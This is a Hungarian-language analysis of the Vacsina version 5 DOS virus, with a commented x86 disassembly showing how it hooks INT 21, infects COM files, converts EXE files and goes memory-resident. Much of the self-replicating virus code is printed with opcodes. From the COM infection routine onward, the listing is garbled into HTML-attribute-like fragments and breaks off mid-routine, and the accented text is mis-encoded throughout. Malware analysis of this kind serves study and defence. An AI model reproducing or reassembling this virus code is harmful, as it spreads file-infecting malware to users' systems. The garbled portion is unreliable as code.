


                                 ***************************
                                 * A Vacsina 5-”s verzi¢ja *
                                 ***************************

A v¡rus a mem¢ri ban val¢ elhelyezked‚se ‚s CS-e szerint van list zva.

A v¡rus hossza COM fileban 1206D-1221D, EXE fileban 132D, illetve 1338D-1353D by
						te.

Nem zen‚l, semmi k rt nem tesz. (Csak a fileok idej‚t nem  ll¡tja vissza. )

A fileokat a 4B DOS funkci¢ megh¡v sakor fert”zi meg.

Egy file fert”z”tts‚g‚t az utols¢ 8 byteb¢l  llap¡tja meg. B”vebb le¡r s t l sd 
						ott. Ki¡rt sa is
ez alapj n t”rt‚nhet.

1206D-n l hosszabb,62867D-n‚l r”videbb,JMP-pal kezd”d” COM fileokat, valamint a 
						64947D-n‚l r”videbb
EXE fileokat fert”zi.A COM fileokat paragrafushat rra kerek¡ti, majd a lejjebb l
						 that¢ form ban
az eg‚sz v¡rust a mem¢riale¡r¢ blokkj val egytt a filehoz m solja. Fert”z‚s ut 
						n egy bip hangot
hallat. A fert”z‚s idej‚re egy VACSINA nev filet megnyit, de semmit sem csin l 
						vele. Futtat skor
az eredeti 3 byteot nem ¡rja vissza, hanem direkt oda ugrik, ahova a file elei J
						MP mutatott.
EXE filehoz, ha a headerje stimmel, 0039-t”l 0084 byteot fz (nincs kerek¡t‚s). 
						Ez a r‚sz semmit
sem csin l, csak futtatja az eredeti EXE-t. C‚lja, hogy EXE-b”l COM-ot csin ljon
						,¡gy a v¡rus k‚s”bb
m r megfert”zheti.rdekes,hogy majdnem ugyanezt a k¢dsorozatot tal ltam t”bb ere
						deti MS-DOS 3.10- s
fileon (DEBUG,PRINT,...). Igy a v¡rus¡r¢ ezt a r‚szt (az EXE-k relok l s t) inne
						n vette. Felt‚te-
lezem, hogy van egy olyan EXE2BIN program, ami nem relok lhat¢ EXE-ket is COM-m 
						 alak¡t. Innen
sz rmazhat ez a k¢dr‚szlet.

Azt, hogy m r a mem¢ri ban van-e a Vacsina a 0000:00C5-”n ehelyezett 397F azonos
						¡t¢sz¢b¢l  llapitja
meg. 0000:00C7-re helyezi a v¡rus verzi¢sz m t.



FFF0 MLB           DB   4D        ;A v¡rus egy kl”n mem¢riablokkban helyezkedik
						 el.
FFF1 MLB_GAZDA     DW   ?         ;Furcsa m¢don ezt is "cipeli" mag val
FFF3 MLB_HOSSZ     DW   ?         ;Mem¢riablokk hossza paragrafusokban
FFF5               DB   0B DUP ?


     ;---------------------------------------------------------------
     ;                           V ltoz¢k
     ;---------------------------------------------------------------

0000 ERE_INT21     DD   ?         ;INT 21 eredeti c¡me
0004 ERE_INT24     DD   ?         ;INT 24 eredeti c¡me
0008 F_ATTR        DW   ?         ;File eredeti attributtuma
000A HANDLE        DW   ?         ;File handle
000C BUFFER        DB   8 DUP (?) ;8 byte beffer


     ;              Egy szabv nyos FCB

0014 FCB           DB   0                   ;Aktu lis drive
0015               DB   'VACSINA    '       ;File n‚v
0020               DW   ?                   ;Kurrens blokk
0022               DW   ?                   ;Rekordhossz
0024               DD   ?                   ;File hossz
0028               DW   ?                   ;D tum
002A               DW   ?                   ;Id”
002C               DB   8 DUP (?)           ;Lefoglalt
0034               DB   ?                   ;Rekordsz m a blokkban
0035               DD   ?                   ;Random rekord


     ;------------------------------------------------------------------
     ;EXE filehoz csak az innent”l kezd”d” 0084 (132D) byteot ¡rja hozz 
     ;------------------------------------------------------------------

0039               DB   '                    '  ;20 db SPC

		   ORG  0045      ;tfed‚s 0045-004C-ig

0045 KEZD_IP       DW   ?         ;ip kezdeti ‚rt‚ke ez lesz
0047 KEZD_CS       DW   ?         ;cs kezdeti ‚rt‚ke ez lesz
0049 KEZD_SP       DW   ?         ;sp kezdeti ‚rt‚ke ez lesz
004B KEZD_SS       DW   ?         ;ss kezdeti ‚rt‚ke ez lesz

     ;---------------------------------------------------------------
     ;                Bel‚p‚si pont eredetileg EXE filen l
     ;---------------------------------------------------------------
     ;Ezzel a r‚sszel ‚ri el, hogy egy EXE file COM form tum£ legyen ‚s lehessen
						 fert”zni

004D E80000        CALL 0050
0050 5B          * POP  BX                  ;bx=0050
0051 50            PUSH AX
0052 8CC0          MOV  AX,ES
0054 051000        ADD  AX,0010             ;ax a program leend” elej‚re mutat
0057 8B0E0E01      MOV  CX,[010E]           ;Stack t vols g
005B 03C8          ADD  CX,AX               ;Mi lesz ss kezdeti ‚rt‚ke
005D 894FFB        MOV  [BX-05],CX          ;KEZD_SS (004B)
0060 8B0E1601      MOV  CX,[0116]           ;K¢dterlet t vols ga
0064 03C8          ADD  CX,AX
0066 894FF7        MOV  [BX-09],CX          ;KEZD_CS (0047)
0069 8B0E1001      MOV  CX,[0110]           ;sp kezdeti ‚rt‚ke
006D 894FF9        MOV  [BX-07],CX          ;KEZD_SP (0049)
0070 8B0E1401      MOV  CX,[0114]           ;ip kezdeti ‚rt‚ke
0074 894FF5        MOV  [BX-0B],CX          ;KEZD_IP (0045)
0077 8B3E1801      MOV  DI,[0118]           ;Els” reklok ci¢s bejegyz‚s
007B 8B160801      MOV  DX,[0108]           ;Header hossza paragrafusban
007F B104          MOV  CL,04
0081 D3E2          SHL  DX,CL               ;Header hossza byteokban
0083 8B0E0601      MOV  CX,[0106]           ;Relok ci¢s bejegyz‚sek sz ma
0087 E317          JCXZ 00A0                ;Ugr s, ha nincs mit relok lni


     ;                       Relok l s ciklusa

0089 26          * ES:
008A C5B50001      LDS  SI,[DI+0100]        ;Hol kell relok lni
008E 83C704        ADD  DI,+04              ;K”vetkez” relok ci¢s bejegyz‚s
0091 8CDD          MOV  BP,DS
0093 26            ES:
0094 032E0801      ADD  BP,[0108]           ;Header hossza paragrafusban
0098 03E8          ADD  BP,AX               ;ax=program (file) val¢di kezdete
009A 8EDD          MOV  DS,BP               ;Itt kell relok lni
009C 0104          ADD  [SI],AX             ;Relok ci¢
009E E2E9          LOOP 0089


     ;            Az  trelok lt programot a hely‚re rakja

00A0 0E          * PUSH CS
00A1 1F            POP  DS                  ;ds=cs
00A2 BF0001        MOV  DI,0100
00A5 8BF2          MOV  SI,DX               ;dx=Header hossza byteokban
00A7 81C60001      ADD  SI,0100
00AB 8BCB          MOV  CX,BX               ;Mennyi byteot kell mozgatni ? (Ez e
						gy kicsit t”bb)
00AD 2BCE          SUB  CX,SI
00AF F3            REPZ
00B0 A4            MOVSB


     ;                    Az eredeti EXE program futtat sa

00B1 58            POP  AX                  ;ax eredeti ‚rt‚ke
00B2 FA            CLI
00B3 8E57FB        MOV  SS,[BX-05]          ;KEZD_SS
00B6 8B67F9        MOV  SP,[BX-07]          ;KEZD_SP
00B9 FB            STI
00BA FF6FF5        JMP  FAR [BX-0B]         ;KEZD_IP, KEZD_CS


     ;---------------------------------------------------------------
     ;               INT 24 (DOS kritikus hibakezel”je)
     ;---------------------------------------------------------------


00BD B003        * MOV	AL,03               ;DOS hib t jelezzen
00BF CF            IRET


     ;---------------------------------------------------------------
     ;                  INT 21 (DOS bel‚p‚si pontja)
     ;---------------------------------------------------------------
     ;          Csak a 4B00 (EXECUTE) funkci¢n l avatkozik k”zbe

00C0 9C          * PUSHF
00C1 3D004B        CMP	AX,4B00
00C4 7406          JZ	00CC
00C6 9D            POPF
00C7 2E            CS:
00C8 FF2E0000      JMP	FAR [0000]



     ;                     A DOS 4B00 alfunkci¢ja

00CC 06          * PUSH	ES                  ;bp+10
00CD 1E            PUSH	DS                  ;bp+0E
00CE 55            PUSH	BP                  ;bp+0C
00CF 57            PUSH	DI                  ;bp+0A
00D0 56            PUSH	SI                  ;bp+08
00D1 52            PUSH	DX                  ;bp+06
00D2 51            PUSH	CX                  ;bp+04
00D3 53            PUSH	BX                  ;bp+02
00D4 50            PUSH	AX                  ;bp+00
00D5 8BEC          MOV	BP,SP


     ;                     INT 24 lek‚rdez‚se,  t¡r sa

00D7 B82435        MOV	AX,3524             ;GET_INT_VECT (es:bx)
00DA CD21          INT	21
00DC 2E            CS:
00DD 8C060600      MOV	[0006],ES           ;ERE_INT24+2
00E1 2E            CS:
00E2 891E0400      MOV	[0004],BX           ;ERE_INT24
00E6 0E            PUSH	CS
00E7 1F            POP	DS
00E8 BABD00        MOV	DX,00BD
00EB B82425        MOV	AX,2524             ;SET_INT_VECT (ds:dx)
00EE CD21          INT	21


     ; A VACSINA nev file megnyit sa (val¢sz¡nleg a v¡rus nyomonk”vet‚se miatt
						)

00F0 0E            PUSH CS                  ;Megj.:felesleges
00F1 1F            POP  DS
00F2 BA1400        MOV  DX,0014
00F5 B40F          MOV  AH,0F               ;OPEN_FCB (ds:dx)
00F7 CD21          INT	21


     ;      File eredeti attributtum nak lek‚rdez‚se, R/O bit t”rl‚se

00F9 B80043        MOV  AX,4300             ;GET_FILE_ATTR (cx)
00FC 8E5E0E        MOV  DS,[BP+0E]
00FF 8B5606        MOV  DX,[BP+06]
0102 CD21          INT  21
0104 7303          JNB  0109
0106 E9DA01        JMP  02E3                ;Hib n l
0109 2E          * CS:
010A 890E0800      MOV  [0008],CX           ;F_ATTR
010E B80143        MOV  AX,4301             ;SET_FILE_ATTR (cx)
0111 80E1FE        AND  CL,FE               ;R/O bit t”rl‚se
0114 CD21          INT  21
0116 7303          JNB  011B
0118 E9C801        JMP  02E3                ;Hib n l


     ;                      C‚lbavett file megnyit sa
     ;      HIBA !!! A file eredeti idej‚t nem k‚rdezi le ‚s nem  ll¡tja vissza.

011B B8023D      * MOV  AX,3D02             ;OPEN_HANDLE (dx:dx)
011E 8E5E0E        MOV  DS,[BP+0E]
0121 8B5606        MOV  DX,[BP+06]
0124 CD21          INT  21
0126 7303          JNB  012B
0128 E9A801        JMP  02D3                ;Hib n l
012B 2E          * CS:
012C A30A00        MOV  [000A],AX           ;HANDLE
012F 8BD8          MOV  BX,AX


     ;              File els” 6 bytej nak beolvas sa a BUFFER-be

0131 0E            PUSH CS
0132 1F            POP  DS
0133 BA0C00        MOV  DX,000C             ;offset BUFFER
0136 B90600        MOV  CX,0006             ;6 byte olvas sa
0139 B43F          MOV  AH,3F               ;READ_HANDLE (bx,ds:dx,cx)
013B CD21          INT  21
013D 7219          JB   0158                ;Hib n l
013F 3D0600        CMP  AX,0006
0142 7514          JNZ	0158


     ;               EXE-e a kiszemelt file ?

0144 2E            CS:
0145 813E0C004D5A  CMP  WORD PTR [000C],5A4D;EXE file-e
014B 7503          JNZ	0150
014D E9B501        JMP	0305


     ;---------------------------------------------------------------
     ;                          COM file
     ;---------------------------------------------------------------

0150 2E          * CS:
0151 803E0C00E9    CMP	BYTE PTR [000C],E9  ;Csak akkor fert”zzk, ha JMP-pal kez
						d”dik
0156 7403          JZ	015B


     ;              Seg‚dugr s hib n l

0158 E96F01      * JMP  02CA


     ;                   1206D < file="" hossz="">< 62867d="" 015b="" b80242="" *="" mov="" ax,4202="" ;file="" v‚g‚re=""  ll s="" 015e="" b90000="" mov="" cx,0000="" 0161="" 8bd1="" mov="" dx,cx="" 0163="" 2e="" cs:="" 0164="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 0168="" cd21="" int="" 21="" ;dx:ax="file" hossz="" 016a="" 72ec="" jb="" 0158="" ;hib n l="" 016c="" 83fa00="" cmp="" dx,+00="" 016f="" 75e7="" jnz="" 0158="" 0171="" 3db604="" cmp="" ax,04b6="" 0174="" 76e2="" jbe="" 0158="" 0176="" 3d93f5="" cmp="" ax,f593="" 0179="" 73dd="" jnb="" 0158="" ;="" file="" adatainak="" elt rol sa="" 017b="" 2e="" cs:="" 017c="" a39e04="" mov="" [049e],ax="" ;ere_hossz="" 017f="" 2e="" cs:="" 0180="" a10d00="" mov="" ax,[000d]="" ;file="" 2.,3.="" byteja="" 0183="" 050301="" add="" ax,0103="" ;+="" 0103="" 0186="" 2e="" cs:="" 0187="" a3a004="" mov="" [04a0],ax="" ;ere_2_3="" ;="" file="" utols¢="" 8="" bytej nak="" beolvas sa="" 018a="" b80242="" mov="" ax,4202="" ;file="" v‚ge-8-dik="" poz¡ci¢ra="" 018d="" b9ffff="" mov="" cx,ffff="" 0190="" baf8ff="" mov="" dx,fff8="" 0193="" 2e="" cs:="" 0194="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 0198="" cd21="" int="" 21="" 019a="" 72bc="" jb="" 0158="" ;hib n l="" 019c="" 2e="" cs:="" 019d="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 01a1="" 0e="" push="" cs="" 01a2="" 1f="" pop="" ds="" 01a3="" ba0c00="" mov="" dx,000c="" ;offset="" buffer="" 01a6="" b90800="" mov="" cx,0008="" ;8="" byte="" olvas sa="" 01a9="" b43f="" mov="" ah,3f="" ;read_handle="" (bx,ds:dx,cx)="" 01ab="" cd21="" int="" 21="" 01ad="" 72a9="" jb="" 0158="" ;hib n l="" 01af="" 3d0800="" cmp="" ax,0008="" 01b2="" 75a4="" jnz="" 0158="" ;hib n l="" ;="" fert”z”tt-e="" m r="" a="" file="" 01b4="" 2e="" cs:="" 01b5="" 813e1000f47a="" cmp="" word="" ptr="" [0010],7af4;azonos¡t¢sz¢="" 01bb="" 7577="" jnz="" 0234="" ;m‚g="" nem="" fer”z”tt="" 01bd="" 2e="" cs:="" 01be="" 833e120005="" cmp="" word="" ptr="" [0012],+05="" ;verzi¢sz m="" 01c3="" 90="" nop="" 01c4="" 7392="" jnb="" 0158="" ;nem="" fert”zzk="" ;---------------------------------------------------------------="" ;="" egy="" kor bbi="" vacsina="" m r="" megfert”zte="" (azt="" ki¡rtja)="" ;---------------------------------------------------------------="" ;="" fert”z”tt="" file="" eredeti="" adatai="" 01c6="" 2e="" cs:="" 01c7="" a10c00="" mov="" ax,[000c]="" ;ere_hossz="" 01ca="" 2e="" cs:="" 01cb="" a39e04="" mov="" [049e],ax="" ;ere_hossz="" 01ce="" 2e="" cs:="" 01cf="" a10e00="" mov="" ax,[000e]="" ;ere_2_3="" 01d2="" 2e="" cs:="" 01d3="" a3a004="" mov="" [04a0],ax="" ;ere_2_3="" 01d6="" 2d0301="" sub="" ax,0103="" 01d9="" 2e="" cs:="" 01da="" a30c00="" mov="" [000c],ax="" ;eredeti="" 2.,3.="" byteja="" a="" filenak="" ;="" file="" eredeti="" 2.,3.="" bytej nak="" vissza¡r sa="" 01dd="" b80042="" mov="" ax,4200="" ;file="" 2.="" bytej ra=""  ll="" 01e0="" b90000="" mov="" cx,0000="" 01e3="" ba0100="" mov="" dx,0001="" 01e6="" 2e="" cs:="" 01e7="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 01eb="" cd21="" int="" 21="" 01ed="" 725f="" jb="" 024e="" ;hib n l="" 01ef="" b440="" mov="" ah,40="" ;write_handle="" (bx,ds:dx,cx)="" 01f1="" 0e="" push="" cs="" 01f2="" 1f="" pop="" ds="" 01f3="" ba0c00="" mov="" dx,000c="" ;offset="" buffer="" 01f6="" b90200="" mov="" cx,0002="" ;2="" byte="" ¡r sa="" 01f9="" cd21="" int="" 21="" 01fb="" 7251="" jb="" 024e="" ;hib n l="" 01fd="" 3d0200="" cmp="" ax,0002="" 0200="" 754c="" jnz="" 024e="" ;hib n l="" ;="" directory="" bejegyz‚s="" aktualiz l sa="" 0202="" 2e="" cs:="" 0203="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 0207="" b445="" mov="" ah,45="" ;duplicate_handle="" (bx)="" 0209="" cd21="" int="" 21="" 020b="" 7208="" jb="" 0215="" ;hib n l="" 020d="" 8bd8="" mov="" bx,ax="" 020f="" b43e="" mov="" ah,3e="" ;close_handle="" (bx)="" 0211="" cd21="" int="" 21="" 0213="" 7239="" jb="" 024e="" ;hib n l="" ;="" file="" eredeti="" m‚retre="" v g sa="" 0215="" b80042="" mov="" ax,4200="" ;file="" eredeti="" v‚g‚re=""  ll="" 0218="" b90000="" mov="" cx,0000="" 021b="" 2e="" cs:="" 021c="" 8b169e04="" mov="" dx,[049e]="" ;ere_hossz="" 0220="" 2e="" cs:="" 0221="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 0225="" cd21="" int="" 21="" 0227="" 7225="" jb="" 024e="" ;hib n l="" 0229="" b440="" mov="" ah,40="" ;write_handle="" (bx,ds:dx,cx)="" 022b="" 0e="" push="" cs="" 022c="" 1f="" pop="" ds="" 022d="" b90000="" mov="" cx,0000="" ;csonkol s="" 0230="" cd21="" int="" 21="" 0232="" 721a="" jb="" 024e="" ;hib n l="" ;="" com="" file="" megfert”z‚se="" ;="" filehossz="" kerek¡t‚se="" paragrafushat rra="" 0234="" b80042="" *="" mov="" ax,4200="" 0237="" b90000="" mov="" cx,0000="" 023a="" 2e="" cs:="" 023b="" 8b169e04="" mov="" dx,[049e]="" ;ere_hossz="" 023f="" 83c20f="" add="" dx,+0f="" 0242="" 83e2f0="" and="" dx,-10="" ;kerek¡t‚s="" 0245="" 2e="" cs:="" 0246="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 024a="" cd21="" int="" 21="" 024c="" 7303="" jnb="" 0251="" ;="" seg‚dugr s="" hib n l="" 024e="" eb7a="" *="" jmp="" 02ca="" ;hib n l="" 0250="" 90="" nop="" ;="" a="" v¡rus="" mem¢riale¡r¢="" blokkj val="" egytt="" hozz m solja="" mag t="" a="" filehoz="" 0251="" 2e="" cs:="" 0252="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 0256="" 8cca="" mov="" dx,cs="" 0258="" 4a="" dec="" dx="" 0259="" 8eda="" mov="" ds,dx="" ;ds="cs-1" (mem.le¡r¢="" blokkra="" mutat)="" 025b="" ba0000="" mov="" dx,0000="" 025e="" b9b604="" mov="" cx,04b6="" ;v¡rus="" hossza="" (1206)="" 0261="" b440="" mov="" ah,40="" ;write_handle="" (bx,ds:dx,cx)="" 0263="" cd21="" int="" 21="" 0265="" 72e7="" jb="" 024e="" ;hib n l="" 0267="" 3db604="" cmp="" ax,04b6="" 026a="" 75e2="" jnz="" 024e="" ;hib n l="" ;="" directory="" bejegyz‚s="" aktualiz l sa="" 026c="" 2e="" cs:="" 026d="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 0271="" b445="" mov="" ah,45="" ;duplicate_handle="" (bx)="" 0273="" cd21="" int="" 21="" 0275="" 7208="" jb="" 027f="" ;hib n l="" 0277="" 8bd8="" mov="" bx,ax="" 0279="" b43e="" mov="" ah,3e="" ;close_handle="" (bx)="" 027b="" cd21="" int="" 21="" 027d="" 72cf="" jb="" 024e="" ;hib n l="" ;="" file="" leend”="" els”="" 3="" bytej nak="" kisz m¡t sa="" 027f="" 2e="" cs:="" 0280="" c6060c00e9="" mov="" byte="" ptr="" [000c],e9="" ;jmp="" k¢dja="" 0285="" 2e="" cs:="" 0286="" 8b169e04="" mov="" dx,[049e]="" ;ere_hossz="" 028a="" 83c20f="" add="" dx,+0f="" 028d="" 83e2f0="" and="" dx,-10="" ;kerek¡t‚s="" 0290="" 83ea03="" sub="" dx,+03="" ;-3="" a="" jmp="" miatt="" 0293="" 81c2ac03="" add="" dx,03ac="" ;bel‚p‚si="" pont="" eltol sa="" a="" file="" v‚g‚h="" ez="" k‚pest="" 0297="" 2e="" cs:="" 0298="" 89160d00="" mov="" [000d],dx="" ;jmp="" operandusa="" ;="" file="" els”="" 3="" bytej nak=""  t¡r sa="" 029c="" b80042="" mov="" ax,4200="" ;file="" elej‚re="" 029f="" b90000="" mov="" cx,0000="" 02a2="" 8bd1="" mov="" dx,cx="" 02a4="" 2e="" cs:="" 02a5="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 02a9="" cd21="" int="" 21="" 02ab="" 72a1="" jb="" 024e="" ;hib n l="" 02ad="" 2e="" cs:="" 02ae="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 02b2="" 0e="" push="" cs="" 02b3="" 1f="" pop="" ds="" 02b4="" ba0c00="" mov="" dx,000c="" ;offset="" beffer="" 02b7="" b90300="" mov="" cx,0003="" ;3="" byte="" ¡r sa="" 02ba="" b440="" mov="" ah,40="" ;write_handle="" (bx,ds:dx,cx)="" 02bc="" cd21="" int="" 21="" 02be="" 728e="" jb="" 024e="" ;hib n l="" 02c0="" 3d0300="" cmp="" ax,0003="" 02c3="" 7589="" jnz="" 024e="" ;hib n l="" ;="" egy="" bell="" kiad sa="" (val¢sz¡nleg="" ez="" a="" verzi¢="" m‚g="" tesztp‚ld ny)="" 02c5="" b8070e="" mov="" ax,0e07="" ;write_teletype="" 02c8="" cd10="" int="" 10="" ;="" file="" lez r sa="" 02ca="" b43e="" *="" mov="" ah,3e="" ;close_handle="" (bx)="" 02cc="" 2e="" cs:="" 02cd="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 02d1="" cd21="" int="" 21="" ;="" file="" eredeti="" attributtum nak="" vissza ll¡t sa="" 02d3="" b80143="" *="" mov="" ax,4301="" ;set_file_attr="" (cx)="" 02d6="" 8e5e0e="" mov="" ds,[bp+0e]="" ;file="" nev‚re="" mutat="" 02d9="" 8b5606="" mov="" dx,[bp+06]="" 02dc="" 2e="" cs:="" 02dd="" 8b0e0800="" mov="" cx,[0008]="" ;f_attr="" 02e1="" cd21="" int="" 21="" ;="" a="" vacsina="" nev="" file="" lez r sa="" (£j="" d tumot="" kap,="" semmi="" m s)="" 02e3="" 0e="" *="" push="" cs="" 02e4="" 1f="" pop="" ds="" 02e5="" ba1400="" mov="" dx,0014="" ;fcb="" 02e8="" b410="" mov="" ah,10="" ;close_fcb="" 02ea="" cd21="" int="" 21="" ;="" int="" 24="" vissza¡r sa,="" eredeti="" dos="" funkci¢="" h¡v sa="" 02ec="" b82425="" mov="" ax,2524="" ;set_int_vect="" (ds:dx)="" 02ef="" 2e="" cs:="" 02f0="" c5160400="" lds="" dx,[0004]="" ;ere_int24="" 02f4="" cd21="" int="" 21="" 02f6="" 58="" pop="" ax="" 02f7="" 5b="" pop="" bx="" 02f8="" 59="" pop="" cx="" 02f9="" 5a="" pop="" dx="" 02fa="" 5e="" pop="" si="" 02fb="" 5f="" pop="" di="" 02fc="" 5d="" pop="" bp="" 02fd="" 1f="" pop="" ds="" 02fe="" 07="" pop="" es="" 02ff="" 9d="" popf="" 0300="" 2e="" cs:="" 0301="" ff2e0000="" jmp="" far="" [0000]="" ;ere_int21="" ;---------------------------------------------------------------="" ;="" exe="" file="" com-m ="" alk¡t sa="" ;---------------------------------------------------------------="" ;="" file="" hossz="">< 64947d="" 0305="" b80242="" *="" mov="" ax,4202="" ;file="" v‚g‚re=""  ll="" 0308="" b90000="" mov="" cx,0000="" 030b="" 8bd1="" mov="" dx,cx="" 030d="" 2e="" cs:="" 030e="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 0312="" cd21="" int="" 21="" 0314="" 72b4="" jb="" 02ca="" ;hib n l="" 0316="" 83fa00="" cmp="" dx,+00="" 0319="" 75af="" jnz="" 02ca="" 031b="" 3db3fd="" cmp="" ax,fdb3="" ;64947d="" 031e="" 73aa="" jnb="" 02ca="" ;="" stimmel-e="" az="" exe="" headerje?="" 0320="" 2e="" cs:="" 0321="" a39e04="" mov="" [049e],ax="" ;ere_hossz="" 0324="" 2e="" cs:="" 0325="" a11000="" mov="" ax,[0010]="" ;filehossz="" lapokban="" 0328="" 48="" dec="" ax="" 0329="" b109="" mov="" cl,09="" ;*="" 512d="" 032b="" d3e0="" shl="" ax,cl="" 032d="" 2e="" cs:="" 032e="" 03060e00="" add="" ax,[000e]="" ;+a="" marad‚k="" 0332="" 2e="" cs:="" 0333="" 3b069e04="" cmp="" ax,[049e]="" ;egyezik-e="" a="" hosszal?="" 0337="" 7591="" jnz="" 02ca="" ;ha="" nem="" ;="" a="" v¡rus="" egy="" r‚sz‚t="" hozz fzi="" az="" exe-hez="" (igy="" com="" lehet="" majd="" az="" exe)="" 0339="" 2e="" cs:="" 033a="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 033e="" b440="" mov="" ah,40="" ;write_handle="" (bx,ds:dx,cx)="" 0340="" 0e="" push="" cs="" 0341="" 1f="" pop="" ds="" 0342="" ba3900="" mov="" dx,0039="" ;innent”l="" 0345="" b98400="" mov="" cx,0084="" ;132d="" byte="" ki¡r sa="" 0348="" cd21="" int="" 21="" 034a="" 72c8="" jb="" 0314="" ;hib n l="" 034c="" 3d8400="" cmp="" ax,0084="" 034f="" 75e6="" jnz="" 0337="" ;hib n l="" ;="" directory="" bejegyz‚s="" aktualiz l sa="" 0351="" 2e="" cs:="" 0352="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 0356="" b445="" mov="" ah,45="" ;duplicate_handle="" (bx)="" 0358="" cd21="" int="" 21="" 035a="" 7208="" jb="" 0364="" ;hib n l="" 035c="" 8bd8="" mov="" bx,ax="" 035e="" b43e="" mov="" ah,3e="" ;close_handle="" (bx)="" 0360="" cd21="" int="" 21="" 0362="" 72b0="" jb="" 0314="" ;hib n l="" ;="" file="" elj‚re="" 0364="" b80042="" mov="" ax,4200="" 0367="" b90000="" mov="" cx,0000="" 036a="" 8bd1="" mov="" dx,cx="" 036c="" 2e="" cs:="" 036d="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 0371="" cd21="" int="" 21="" 0373="" 729f="" jb="" 0314="" ;hib n l="" ;="" leend”="" els”="" 3="" byte="" kisz m¡t sa="" 0375="" 2e="" cs:="" 0376="" c6060c00e9="" mov="" byte="" ptr="" [000c],e9="" ;jmp="" k¢dja="" 037b="" 2e="" cs:="" 037c="" a19e04="" mov="" ax,[049e]="" ;ere_hossz="" 037f="" 051100="" add="" ax,0011="" ;0039+0011+3="004D" a="" bel‚p‚si="" pont="" 0382="" 2e="" cs:="" 0383="" a30d00="" mov="" [000d],ax="" ;jmp="" operandusa="" ;="" az="" els”="" 3="" byte="" fell¡r sa="" 0386="" 2e="" cs:="" 0387="" 8b1e0a00="" mov="" bx,[000a]="" ;handle="" 038b="" b440="" mov="" ah,40="" ;write_handle="" 038d="" 0e="" push="" cs="" 038e="" 1f="" pop="" ds="" 038f="" ba0c00="" mov="" dx,000c="" ;offset="" buffer="" 0392="" b90300="" mov="" cx,0003="" ;3="" byte="" ¡r sa="" 0395="" cd21="" int="" 21="" ;com="" t¡pus£="" lesz="" a="" file="" 0397="" e930ff="" jmp="" 02ca="" ;v‚ge="" ;megj.:ha="" itt="" egy="" jmp="" 0150=""  llna="" egyb”l="" fert”zhetne="" exe-t="" ;---------------------------------------------------------------="" ;="" v ltoz¢="" (ax="" eredeti="" ‚rt‚ke)="" ;---------------------------------------------------------------="" 039a="" ere_ax="" dw="" ;---------------------------------------------------------------="" ;="" bel‚p‚si="" pont="" com="" programn l="" ;---------------------------------------------------------------="" 039c="" e80000="" *="" call="" 039f="" 039f="" 5b="" *="" pop="" bx="" ;bx="039F" 03a0="" 2e="" cs:="" 03a1="" 8947fb="" mov="" [bx-05],ax="" ;ere_ax="" (039a)="" ;="" annak="" eld”nt‚se,="" hogy="" a="" mem¢ri ban="" ven-e="" m r="" vacsina="" 03a4="" b80000="" mov="" ax,0000="" 03a7="" 8ec0="" mov="" es,ax="" 03a9="" 26="" es:="" 03aa="" a1c500="" mov="" ax,[00c5]="" ;int="" 31="" vektor nak="" 2.,3.="" byteja="" 03ad="" 3d7f39="" cmp="" ax,397f="" ;van-e="" m r="" vacsina="" a="" mem¢ri ban="" 03b0="" 7508="" jnz="" 03ba="" ;ugr s,="" ha="" m‚g="" nem.="" 03b2="" 26="" es:="" 03b3="" a0c700="" mov="" al,[00c7]="" ;mem¢ri ban="" l‚v”="" v¡rus="" verzi¢sz ma="" 03b6="" 3c05="" cmp="" al,05="" ;ennek="" a="" v¡rusnak="" a="" verzi¢sz ma="" 03b8="" 7332="" jnb="" 03ec="" ;ugr s,="" ha="" £jjabb="" vagy="" ez="" a="" verzi¢="" ;="" van-e="" el‚g="" szadab="" mem¢ria="" 03ba="" 8bd4="" *="" mov="" dx,sp="" 03bc="" 2bd3="" sub="" dx,bx="" 03be="" 81ea6c0b="" sub="" dx,0b6c="" 03c2="" 7228="" jb="" 03ec="" ;ugr s,="" ha="" nincs="" el‚g="" szabad="" mem¢ria="" ;a="" v¡rus="" kl”n="" mem¢riablokkba="" fog="" kerlni,="" aminek="" le¡r¢="" blokkja="" a="" v¡rus="" el”="" tt="" helyezkedik="" el.="" ;ennek="" a="" mem¢riablokknak="" hossz t=""  ll¡tja="" itt="" be.="" 03c4="" bac504="" mov="" dx,04c5="" ;v¡rus=""  ltal="" ig‚nyelt="" mem¢ria="" +="" 0f="" 03c7="" b104="" mov="" cl,04="" 03c9="" d3ea="" shr="" dx,cl="" ;div="" 10="" 03cb="" 2e="" cs:="" 03cc="" 899754fc="" mov="" [bx+fc54],dx="" ;mlb_hossz="" (fff3)="" mem¢riale¡r¢="" blokk="" hossza="" ;="" a="" v¡rus="" h tr‚bb="" m solja="" mag t="" (004c="" paragrafussal)="" 03d0="" 8cd9="" mov="" cx,ds="" 03d2="" 03d1="" add="" dx,cx="" 03d4="" 8ec2="" mov="" es,dx="" ;ide="" kell="" h tr‚bbmozgatni="" mindent="" 03d6="" 8bf3="" mov="" si,bx="" 03d8="" 81c651fc="" add="" si,fc51="" ;si="FFF0" (v¡rus="" a="" hozz ="" csatolt="" mem¢="" riale¡r¢="" blokkal)="" 03dc="" 8bfe="" mov="" di,si="" ;ugyanilyen="" offset="" helyre="" m sol="" 03de="" b9b604="" mov="" cx,04b6="" ;v¡rus="" hossza="" 03e1="" fc="" cld="" 03e2="" f3="" repz="" 03e3="" a4="" movsb="" ;="" a="" vez‚rl‚s=""  tkerl="" a="" "m solat"="" v¡rusra="" 03e4="" 06="" push="" es="" 03e5="" e80300="" call="" 03eb="" 03e8="" eb13="" jmp="" 03fd="" ;es:03fd-n="" folytat¢dik="" 03ea="" 90="" nop="" 03eb="" cb="" *="" retf="" ;="" az="" eredeti="" program="" 